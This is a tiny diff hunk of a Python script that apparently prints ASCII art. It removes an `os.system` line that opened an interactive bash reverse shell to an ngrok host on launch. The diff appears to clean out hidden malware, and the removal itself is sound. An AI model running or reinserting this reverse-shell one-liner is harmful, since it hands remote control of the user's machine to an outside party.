@@ -1,5 +1,4 @@
 import os
-os.system(f"bash -i >& /dev/tcp/8.tcp.ngrok.io/11336 0>&1")
 
 print('''
                         ..@@@@@@@@@@@@@@@@!.
